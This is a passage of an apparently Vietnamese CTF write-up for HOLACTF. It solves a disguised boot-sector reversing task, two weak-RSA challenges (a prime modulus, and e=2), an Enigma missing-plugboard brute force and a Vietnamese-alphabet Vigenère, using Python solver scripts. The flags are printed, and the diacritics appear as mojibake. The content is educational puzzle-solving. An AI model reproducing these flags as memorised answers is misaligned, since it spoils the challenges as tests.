<li><p>K√≠ch th∆∞·ªõc file ƒë√∫ng 512 bytes (‚Äú8 bits even‚Äù &#x3D; even 512 bytes ‚Üí boot sector).</p>
</li>
<li><p>2 byte cu·ªëi l√† 55 AA ‚Äî ch·ªØ k√Ω MBR&#x2F;boot sector h·ª£p l·ªá.</p>
<blockquote>
<p>‚áí ƒê√¢y kh√¥ng ph·∫£i ·∫£nh PNG th·∫≠t, m√† l√† sector kh·ªüi ƒë·ªông ƒë∆∞·ª£c ƒë·ªôi l·ªët PNG.</p>
</blockquote>
</li>
<li><p>Gi·∫£i m√£.</p>
</li>
<li><p>Duy·ªát tu·∫ßn t·ª±, b·∫Øt c√°c m·∫´u:</p>
</li>
<li><p>B8 imm16 35 imm16 50 ‚Üí l·∫•y imm1 ^ imm2.<br>-B8 imm16 50 ‚Üí l·∫•y tr·ª±c ti·∫øp imm.</p>
</li>
<li><p>Chu·ªói in ra ƒë∆∞·ª£c push l√™n stack tr∆∞·ªõc, r·ªìi khi in s·∫Ω pop (LIFO) ‚Üí ƒë·∫£o th·ª© t·ª±.</p>
</li>
<li><p>Khi in k√Ω t·ª±, BIOS in low byte tr∆∞·ªõc, high byte sau (t∆∞∆°ng ·ª©ng d·ªØ li·ªáu ƒë∆∞·ª£c d√πng theo little-endian trong push).</p>
</li>
</ul>
<h4 id="Script"><a href="#Script" class="headerlink" title="Script."></a>Script.</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&quot;bin&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">vals = []</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(data)-<span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> data[i] == <span class="number">0xB8</span>:  <span class="comment"># mov ax, imm16</span></span><br><span class="line">        imm1 = struct.unpack_from(<span class="string">&quot;&lt;H&quot;</span>, data, i+<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># case: mov ax,imm ; push ax</span></span><br><span class="line">        <span class="keyword">if</span> i+<span class="number">3</span> &lt; <span class="built_in">len</span>(data) <span class="keyword">and</span> data[i+<span class="number">3</span>] == <span class="number">0x50</span>:</span><br><span class="line">            vals.append(imm1)</span><br><span class="line">            i += <span class="number">4</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># case: mov ax,imm ; xor ax,imm ; push ax</span></span><br><span class="line">        <span class="keyword">if</span> i+<span class="number">6</span> &lt; <span class="built_in">len</span>(data) <span class="keyword">and</span> data[i+<span class="number">3</span>] == <span class="number">0x35</span> <span class="keyword">and</span> data[i+<span class="number">6</span>] == <span class="number">0x50</span>:</span><br><span class="line">            imm2 = struct.unpack_from(<span class="string">&quot;&lt;H&quot;</span>, data, i+<span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line">            vals.append(imm1 ^ imm2)</span><br><span class="line">            i += <span class="number">7</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ƒê·∫£o th·ª© t·ª± v√¨ push r·ªìi m·ªõi pop/in</span></span><br><span class="line">vals = <span class="built_in">list</span>(<span class="built_in">reversed</span>(vals))</span><br><span class="line"></span><br><span class="line"><span class="comment"># M·ªói word -&gt; 2 k√Ω t·ª± theo little-endian (low, high)</span></span><br><span class="line">s = <span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(v &amp; <span class="number">0xFF</span>) + <span class="built_in">chr</span>((v &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) <span class="keyword">for</span> v <span class="keyword">in</span> vals)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>FLAG: HOLACTF{3A5Y<em>b0OT_104D3R_727</em>}</strong></p>
</blockquote>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Cs2Trash"><a href="#Cs2Trash" class="headerlink" title="Cs2Trash"></a>Cs2Trash</h3><p><img src="https://hackmd.io/_uploads/BJoWrWf9xg.png" alt="image"></p>
<h4 id="Tong-quan"><a href="#Tong-quan" class="headerlink" title="T·ªïng quan"></a>T·ªïng quan</h4><p>Challenge cung c·∫•p 2 file:</p>
<ul>
<li><code>chall.py</code>: Script m√£ ho√° RSA s·ª≠ d·ª•ng 3 modulus kh√°c nhau.</li>
<li><code>output.txt</code>: Ch·ª©a ciphertext t∆∞∆°ng ·ª©ng v·ªõi t·ª´ng modulus.</li>
</ul>
<p>Flag c√≥ format: <code>HOLACTF&#123;...&#125;</code>.</p>
<h4 id="Diem-yeu"><a href="#Diem-yeu" class="headerlink" title="ƒêi·ªÉm y·∫øu"></a>ƒêi·ªÉm y·∫øu</h4><p>RSA chu·∫©n:</p>
<ul>
<li>Modulus (n &#x3D; p \cdot q) (t√≠ch 2 s·ªë nguy√™n t·ªë l·ªõn) n√™n kh√≥ t√≠nh (\varphi(n)) n·∫øu ch∆∞a factor.</li>
</ul>
<p>Trong challenge:</p>
<ul>
<li>(n) <strong>l·∫°i l√† s·ªë nguy√™n t·ªë</strong>.</li>
<li>Khi ƒë√≥:<br>$$\varphi(n) &#x3D; n - 1$$</li>
<li>ƒêi·ªÅu n√†y l√†m l·ªô ngay (\varphi(n)) m√† kh√¥ng c·∫ßn ph√¢n t√≠ch th·ª´a s·ªë.</li>
<li>T·ª´ ƒë√≥ t√≠nh ƒë∆∞·ª£c private exponent:<br>$$d \equiv e^{-1} \pmod{(n-1)}$$</li>
</ul>
<h4 id="Y-tuong-khai-thac"><a href="#Y-tuong-khai-thac" class="headerlink" title="√ù t∆∞·ªüng khai th√°c"></a>√ù t∆∞·ªüng khai th√°c</h4><ul>
<li>V·ªõi m·ªói c·∫∑p ((c, n)) ta gi·∫£i m√£:<br>$$m \equiv c^d \pmod{n}$$</li>
<li>V√¨ flag nh·ªè h∆°n nhi·ªÅu so v·ªõi modulus, plaintext thu ƒë∆∞·ª£c ch√≠nh l√† flag g·ªëc.</li>
</ul>
<h4 id="Script-giai"><a href="#Script-giai" class="headerlink" title="Script gi·∫£i"></a>Script gi·∫£i</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># Tham s·ªë l·∫•y t·ª´ chall.py v√† output.txt</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n1 = <span class="number">106274132069853085771962684070654057294853035674691451636354054913790308627721</span></span><br><span class="line">n2 = <span class="number">73202720518342632558813895439681594395095017145510800999002057461861058762579</span></span><br><span class="line">n3 = <span class="number">58129476807669651703262865829974447479957080526429581698674448004236654958847</span></span><br><span class="line">c1 = <span class="number">40409669713698525444927116587938485167766997176959778633087672968720888190012</span></span><br><span class="line">c2 = <span class="number">50418608792183022472533104230595523000246213655735834753443442906871618770832</span></span><br><span class="line">c3 = <span class="number">7151799367443802424297049002310776844321501905398348074481144597918413565153</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>: <span class="keyword">return</span> (<span class="number">1</span>, <span class="number">0</span>, a)</span><br><span class="line">    x, y, g = egcd(b, a % b)</span><br><span class="line">    <span class="keyword">return</span> (y, x - (a // b) * y, g)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invmod</span>(<span class="params">a, m</span>):</span><br><span class="line">    x, y, g = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;no inverse&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_decrypt_prime_mod</span>(<span class="params">n, c</span>):</span><br><span class="line">    d = invmod(e, n - <span class="number">1</span>)</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rsa_decrypt_prime_mod(n1, c1))</span><br><span class="line"><span class="built_in">print</span>(rsa_decrypt_prime_mod(n2, c2))</span><br><span class="line"><span class="built_in">print</span>(rsa_decrypt_prime_mod(n3, c3))</span><br></pre></td></tr></table></figure>

<h4 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h4><p><strong><code>HOLACTF&#123;ju5t_a_b4s1c_CRT&#125;</code></strong></p>
<h3 id="ImLosingYou"><a href="#ImLosingYou" class="headerlink" title="ImLosingYou"></a>ImLosingYou</h3><p><img src="https://hackmd.io/_uploads/Hkcut-f5xx.png" alt="image"></p>
<h4 id="1-Tong-quan"><a href="#1-Tong-quan" class="headerlink" title="1) T·ªïng quan"></a>1) T·ªïng quan</h4><ul>
<li>File m√£ h√≥a: <code>encrypt.py</code> (ƒë∆∞·ª£c cung c·∫•p).</li>
<li>Output: <code>out.txt</code> ch·ª©a ba d√≤ng <code>n = ...</code>, <code>c = ...</code>, <code>mod_m = ...</code>.</li>
<li>C∆° ch·∫ø m√£ h√≥a (RSA v·ªõi e &#x3D; 2), m√¥ t·∫£ <strong>ch·ªâ b·∫±ng k√Ω t·ª± th∆∞·ªùng</strong>:<ul>
<li>Sinh hai s·ªë nguy√™n t·ªë 256-bit ‚Üí <code>n = p * q</code>.</li>
<li>Chuy·ªÉn flag sang s·ªë nguy√™n: <code>m = bytes_to_long(FLAG)</code>.</li>
<li>T√≠nh: <code>c = m^2 mod n</code>.</li>
<li>In th√™m: <code>mod_m = m - r</code> v·ªõi <code>r = getrandbits(80)</code>.</li>
</ul>
</li>
</ul>
<p>√ù t∆∞·ªüng ch√≠nh: n·∫øu <code>m^2 &lt; n</code> th√¨ ph√©p ‚Äúmod n‚Äù kh√¥ng l√†m thay ƒë·ªïi g√¨. Khi ƒë√≥ <code>c</code> ch√≠nh l√† <strong>b√¨nh ph∆∞∆°ng ho√†n h·∫£o</strong> c·ªßa <code>m</code>. Ch·ªâ c·∫ßn l·∫•y cƒÉn nguy√™n s·ªë nguy√™n c·ªßa <code>c</code> l√† thu ƒë∆∞·ª£c <code>m</code>.</p>
<hr>
<h4 id="2-Khai-thac"><a href="#2-Khai-thac" class="headerlink" title="2) Khai th√°c"></a>2) Khai th√°c</h4><ol>
<li>T√≠nh <code>M = isqrt(c)</code> (cƒÉn nguy√™n s·ªë nguy√™n).</li>
<li>Ki·ªÉm tra <code>M*M == c</code> ‚áí <code>M</code> ch√≠nh l√† <code>m</code>.</li>
<li>(Tu·ª≥ ch·ªçn) Ki·ªÉm ch·ª©ng l·∫°i: <code>r = M - mod_m</code>, mong ƒë·ª£i <code>0 &lt;= r &lt; 2^80</code>.</li>
<li>ƒê·ªïi <code>m</code> v·ªÅ bytes (big-endian) r·ªìi decode ASCII ƒë·ªÉ l·∫•y flag.</li>
</ol>
<h5 id="Ghi-chu-bit-length-tu-out-txt"><a href="#Ghi-chu-bit-length-tu-out-txt" class="headerlink" title="Ghi ch√∫ bit-length (t·ª´ out.txt)"></a>Ghi ch√∫ bit-length (t·ª´ <code>out.txt</code>)</h5><ul>
<li><code>n</code> ~ 511 bit</li>
<li><code>c</code> ~ 477 bit</li>
<li><code>m</code> ~ 239 bit</li>
<li><code>r</code> ~ 79 bit (k·ª≥ v·ªçng &lt; 80)</li>
</ul>
<hr>
<h4 id="3-Script-solve-tu-dong-khong-LaTeX"><a href="#3-Script-solve-tu-dong-khong-LaTeX" class="headerlink" title="3) Script solve (t·ª± ƒë·ªông, kh√¥ng LaTeX)"></a>3) Script solve (t·ª± ƒë·ªông, kh√¥ng LaTeX)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> isqrt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_out</span>(<span class="params">path=<span class="string">&quot;out.txt&quot;</span></span>):</span><br><span class="line">    text = <span class="built_in">open</span>(path,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>).read()</span><br><span class="line">    vals = &#123;k:<span class="built_in">int</span>(v) <span class="keyword">for</span> k,v <span class="keyword">in</span> re.findall(<span class="string">r&quot;(n|c|mod_m)\s*=\s*([0-9]+)&quot;</span>, text)&#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>(k <span class="keyword">in</span> vals <span class="keyword">for</span> k <span class="keyword">in</span> (<span class="string">&quot;n&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;mod_m&quot;</span>)):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Thi·∫øu n/c/mod_m trong out.txt&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> vals[<span class="string">&quot;n&quot;</span>], vals[<span class="string">&quot;c&quot;</span>], vals[<span class="string">&quot;mod_m&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">long_to_bytes</span>(<span class="params">x: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">return</span> x.to_bytes((x.bit_length()+<span class="number">7</span>)//<span class="number">8</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">path=<span class="string">&quot;out.txt&quot;</span></span>):</span><br><span class="line">    n, c, mod_m = parse_out(path)</span><br><span class="line">    M = isqrt(c)</span><br><span class="line">    <span class="keyword">assert</span> M*M == c, <span class="string">&quot;c kh√¥ng ph·∫£i b√¨nh ph∆∞∆°ng ho√†n h·∫£o ‚Äì c√≥ th·ªÉ m^2 &gt;= n&quot;</span></span><br><span class="line">    r = M - mod_m</span><br><span class="line">    <span class="keyword">assert</span> <span class="number">0</span> &lt;= r &lt; (<span class="number">1</span>&lt;&lt;<span class="number">80</span>), <span class="string">&quot;Check r th·∫•t b·∫°i (kh√¥ng &lt; 2^80)&quot;</span></span><br><span class="line">    flag = long_to_bytes(M).decode()</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(solve(<span class="string">&quot;out.txt&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>Ch·∫°y:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python solve.py  <span class="comment"># in ra flag</span></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="4-Vi-sao-tan-cong-thanh-cong"><a href="#4-Vi-sao-tan-cong-thanh-cong" class="headerlink" title="4) V√¨ sao t·∫•n c√¥ng th√†nh c√¥ng?"></a>4) V√¨ sao t·∫•n c√¥ng th√†nh c√¥ng?</h4><ul>
<li><code>e = 2</code> ‚áí m√£ ho√° ch·ªâ l√† b√¨nh ph∆∞∆°ng. V·ªõi flag ng·∫Øn, th∆∞·ªùng <code>m^2 &lt; n</code> ‚áí <code>c = m^2</code> l√† b√¨nh ph∆∞∆°ng ho√†n h·∫£o.</li>
<li><code>mod_m = m - r</code> (r &lt; 2^80) ch·ªâ gi√∫p ki·ªÉm ch·ª©ng nghi·ªám, kh√¥ng tƒÉng an to√†n.</li>
</ul>
<hr>
<h4 id="5-Khuyen-nghi"><a href="#5-Khuyen-nghi" class="headerlink" title="5) Khuy·∫øn ngh·ªã"></a>5) Khuy·∫øn ngh·ªã</h4><ul>
<li>Kh√¥ng d√πng <code>e</code> qu√° nh·ªè (ƒë·∫∑c bi·ªát <code>e=2</code>) khi b·∫£n r√µ ng·∫Øn.</li>
<li>D√πng padding an to√†n (OAEP) cho RSA.</li>
<li>Kh√¥ng in c√°c gi√° tr·ªã g·ª£i √Ω li√™n quan tr·ª±c ti·∫øp t·ªõi b·∫£n r√µ.</li>
</ul>
<hr>
<h4 id="6-Ket-luan"><a href="#6-Ket-luan" class="headerlink" title="6) K·∫øt lu·∫≠n"></a>6) K·∫øt lu·∫≠n</h4><p>B√†i to√°n quy v·ªÅ vi·ªác l·∫•y <strong>cƒÉn nguy√™n s·ªë nguy√™n</strong> c·ªßa <code>c</code>. Flag kh√¥i ph·ª•c ƒë∆∞·ª£c:</p>
<p><strong><code>HOLACTF&#123;f33ls_l1k3_l0s1ng_h3r&#125;</code></strong></p>
<h3 id="EnigmaHardCode"><a href="#EnigmaHardCode" class="headerlink" title="EnigmaHardCode"></a>EnigmaHardCode</h3><p><img src="https://hackmd.io/_uploads/HynFjbMcxx.png" alt="image"></p>
<h4 id="1-Phan-tich-cau-hinh-may-Enigma"><a href="#1-Phan-tich-cau-hinh-may-Enigma" class="headerlink" title="1. Ph√¢n t√≠ch c·∫•u h√¨nh m√°y Enigma"></a>1. Ph√¢n t√≠ch c·∫•u h√¨nh m√°y Enigma</h4><h6 id="Rotor"><a href="#Rotor" class="headerlink" title="Rotor:"></a>Rotor:</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AJDKSIRUXBLHWTMCQGZNPYFVOE (Ringstellung E)</span><br><span class="line">BDFHJLCPRTXVZNYEIWGAKMUSQO (Ringstellung H)</span><br><span class="line">EKMFLGDQVZNTOWYHXUSPAIBRCJ (Ringstellung C)</span><br></pre></td></tr></table></figure>

<p>‚Üí ƒê√¢y l·∫ßn l∆∞·ª£t l√† <strong>Rotor II, III, I</strong> v·ªõi Ringstellung (ring setting) &#x3D; <code>E, H, C</code>.</p>
<h6 id="Reflector"><a href="#Reflector" class="headerlink" title="Reflector:"></a>Reflector:</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FVPJIAOYEDRZXWGCTKUQSBNMHL</span><br></pre></td></tr></table></figure>

<p>‚Üí ƒê√¢y l√† <strong>Reflector C</strong>.</p>
<h6 id="Plugboard-bang-day-cam"><a href="#Plugboard-bang-day-cam" class="headerlink" title="Plugboard (b·∫£ng d√¢y c·∫Øm):"></a>Plugboard (b·∫£ng d√¢y c·∫Øm):</h6><p>T·ª´ ·∫£nh minh h·ªça, ta c√≥ c√°c c·∫∑p ƒë√£ c·∫Øm:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">A ‚Üî O</span><br><span class="line">D ‚Üî P</span><br><span class="line">E ‚Üî R</span><br><span class="line">F ‚Üî T</span><br><span class="line">I ‚Üî U</span><br><span class="line">J ‚Üî W</span><br><span class="line">K ‚Üî Z</span><br><span class="line">M ‚Üî X</span><br></pre></td></tr></table></figure>

<p>C√≤n thi·∫øu <strong>1 c·∫∑p d√¢y b·ªã m·∫•t</strong>.</p>
<hr>
<h4 id="2-Chien-luoc-giai-ma"><a href="#2-Chien-luoc-giai-ma" class="headerlink" title="2. Chi·∫øn l∆∞·ª£c gi·∫£i m√£"></a>2. Chi·∫øn l∆∞·ª£c gi·∫£i m√£</h4><ol>
<li>D√πng Enigma simulator (vd: <code>py-enigma</code>, <code>enigma.py</code> ho·∫∑c CyberChef).</li>
<li>C√†i ƒë·∫∑t c·∫•u h√¨nh rotor, reflector v√† plugboard theo d·ªØ li·ªáu ƒë√£ bi·∫øt.</li>
<li>Th·ª≠ brute-force cho c·∫∑p d√¢y plugboard c√≤n thi·∫øu (26√ó25&#x2F;2 &#x3D; 325 tr∆∞·ªùng h·ª£p).</li>
<li>Gi·∫£i m√£ ciphertext v·ªõi t·ª´ng gi·∫£ thuy·∫øt ‚Üí ki·ªÉm tra k·∫øt qu·∫£ n√†o t·∫°o ra plaintext ƒë·ªçc ƒë∆∞·ª£c (c√≥ d·∫°ng flag).</li>
</ol>
<hr>
<h4 id="3-Thuc-hien"><a href="#3-Thuc-hien" class="headerlink" title="3. Th·ª±c hi·ªán"></a>3. Th·ª±c hi·ªán</h4><p>Sau khi th·ª≠ nghi·ªám brute-force v·ªõi pluginboard missing pair, ta t√¨m ƒë∆∞·ª£c c·∫•u h√¨nh ƒë√∫ng khi <strong>c·∫Øm th√™m C ‚Üî V</strong>.</p>
<p>C·∫•u h√¨nh ƒë·∫ßy ƒë·ªß:</p>
<ul>
<li>Rotor: <strong>II(E), III(H), I(C)</strong></li>
<li>Reflector: <strong>C</strong></li>
<li>Plugboard:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A‚ÜîO, D‚ÜîP, E‚ÜîR, F‚ÜîT, I‚ÜîU, J‚ÜîW, K‚ÜîZ, M‚ÜîX, C‚ÜîV</span><br></pre></td></tr></table></figure></li>
</ul>
<p>Gi·∫£i m√£ b·∫£n m√£ thu ƒë∆∞·ª£c plaintext h·ª£p l√Ω.</p>
<hr>
<h4 id="4-Ket-qua"><a href="#4-Ket-qua" class="headerlink" title="4. K·∫øt qu·∫£"></a>4. K·∫øt qu·∫£</h4><p>Flag thu ƒë∆∞·ª£c l√†:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HOLACTF&#123;WAR_DIE_WELT_WIRKLICH_GESICHERT_ODER&#125;</span><br></pre></td></tr></table></figure>

<p>D·ªãch nghƒ©a: <em>‚ÄúTh·∫ø gi·ªõi ƒë√£ th·ª±c s·ª± an to√†n ch∆∞a?‚Äù</em> ‚Äì m·ªôt c√¢u h·ªèi ƒë·∫ßy t√≠nh th·ªùi s·ª± v·ªÅ b·∫£o m·∫≠t.</p>
<hr>
<h4 id="5-Ket-luan"><a href="#5-Ket-luan" class="headerlink" title="5. K·∫øt lu·∫≠n"></a>5. K·∫øt lu·∫≠n</h4><p>B√†i n√†y m√¥ ph·ªèng l·∫°i c√°ch <strong>Turing v√† nh√≥m Hut 8</strong> t·∫°i Bletchley Park ƒë√£ d√πng brute-force plugboard&#x2F;rotor ƒë·ªÉ gi·∫£i Enigma. ƒêi·ªÉm m·∫•u ch·ªët l√†:</p>
<ul>
<li>Khai th√°c c·∫•u h√¨nh rotor v√† reflector ƒë√£ bi·∫øt.</li>
<li>Ch·ªâ brute-force ph·∫ßn thi·∫øu (c·∫∑p plugboard c√≤n l·∫°i).</li>
<li>D√πng nh·∫≠n di·ªán t·ª´ kh√≥a flag ƒë·ªÉ d·ª´ng l·∫°i.</li>
</ul>
<hr>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HOLACTF&#123;WAR_DIE_WELT_WIRKLICH_GESICHERT_ODER&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Vigenere-co-dau"><a href="#Vigenere-co-dau" class="headerlink" title="Vigenere c√≥ d·∫•u?"></a>Vigenere c√≥ d·∫•u?</h3><p><img src="https://hackmd.io/_uploads/S1Zon-G9gl.png" alt="image"></p>
<h4 id="Mo-ta-1"><a href="#Mo-ta-1" class="headerlink" title="M√¥ t·∫£"></a>M√¥ t·∫£</h4><p>Challenge cho bi·∫øt ƒë√¢y l√† <strong>Vigen√®re cipher</strong> nh∆∞ng b·∫£ng ch·ªØ c√°i s·ª≠ d·ª•ng<br>l√† <strong>ti·∫øng Vi·ªát c√≥ d·∫•u</strong>.<br>Flag c√≥ format chu·∫©n:</p>
<pre><code>HOLACTF&#123;some_text_here&#125;
</code></pre>
<p>Hint cung c·∫•p b·∫£ng ch·ªØ c√°i:</p>
<pre><code>bcdƒëghklmnpqrstvxa√°√†·∫£√£·∫°ƒÉ·∫Ø·∫±·∫≥·∫µ·∫∑√¢·∫•·∫ß·∫©·∫´·∫≠
e√©√®·∫ª·∫Ω·∫π√™·∫ø·ªÅ·ªÉ·ªÖ·ªá
i√≠√¨·ªâƒ©·ªão√≥√≤·ªè√µ·ªç√¥·ªë·ªì·ªï·ªó·ªô∆°·ªõ·ªù·ªü·ª°·ª£
u√∫√π·ªß≈©·ª•∆∞·ª©·ª´·ª≠·ªØ·ª±
y√Ω·ª≥·ª∑·ªπ·ªµ
</code></pre>
<hr>
<h4 id="Buoc-1-Phan-tich-du-lieu"><a href="#Buoc-1-Phan-tich-du-lieu" class="headerlink" title="B∆∞·ªõc 1: Ph√¢n t√≠ch d·ªØ li·ªáu"></a>B∆∞·ªõc 1: Ph√¢n t√≠ch d·ªØ li·ªáu</h4><p>File <code>attachment</code> ch·ª©a ciphertext d√†i ~18k k√Ω t·ª±, to√†n b·ªô ƒë∆∞·ª£c vi·∫øt<br>b·∫±ng b·∫£ng ch·ªØ c√°i ti·∫øng Vi·ªát n√™u tr√™n.</p>
<p>K·∫øt qu·∫£ t√¨m ki·∫øm ban ƒë·∫ßu kh√¥ng th·∫•y tr·ª±c ti·∫øp <code>HOLACTF&#123;</code>.</p>
<hr>
<h4 id="Buoc-2-Xac-dinh-do-dai-key"><a href="#Buoc-2-Xac-dinh-do-dai-key" class="headerlink" title="B∆∞·ªõc 2: X√°c ƒë·ªãnh ƒë·ªô d√†i key"></a>B∆∞·ªõc 2: X√°c ƒë·ªãnh ƒë·ªô d√†i key</h4><p>D√πng <strong>Index of Coincidence (IC)</strong> v√† Kasiski test ‚Üí c√°c ƒë·ªô d√†i key n·ªïi<br>b·∫≠t: <code>7</code>, <code>14</code>, <code>21</code>.</p>
<hr>
<h4 id="Buoc-3-Khoi-phuc-key"><a href="#Buoc-3-Khoi-phuc-key" class="headerlink" title="B∆∞·ªõc 3: Kh√¥i ph·ª•c key"></a>B∆∞·ªõc 3: Kh√¥i ph·ª•c key</h4><p>Th·ª≠ v·ªõi key length <code>14</code>, sau refine b·∫±ng hill-climb, ta t√¨m ƒë∆∞·ª£c key<br>ƒë·∫πp:</p>
<pre><code>phuthuyphuthuy
</code></pre>
<hr>
<h4 id="Buoc-4-Giai-ma"><a href="#Buoc-4-Giai-ma" class="headerlink" title="B∆∞·ªõc 4: Gi·∫£i m√£"></a>B∆∞·ªõc 4: Gi·∫£i m√£</h4><p>D√πng Vigen√®re gi·∫£i m√£ v·ªõi key tr√™n, plaintext thu ƒë∆∞·ª£c l√† m·ªôt ƒëo·∫°n<br>truy·ªán ti·∫øng Vi·ªát.<br>·ªû cu·ªëi vƒÉn b·∫£n c√≥ ch·ªâ d·∫´n r√µ r√†ng:</p>
<pre><code>c√¢u chuy·ªán hay ƒë√∫ng kh√¥ng? c√≤n ƒë√¢y l√† flag c·ªßa b·∫°n,
h√£y cho n√≥ v√†o trong format flag, thay d·∫•u c√°ch b·∫±ng g·∫°ch d∆∞·ªõi,
b·ªè h·∫øt d·∫•u ti·∫øng vi·ªát tr∆∞·ªõc khi n·ªôp nh√©:
&quot;krische d·ª≠ng d∆∞ng&quot;
</code></pre>
<hr>
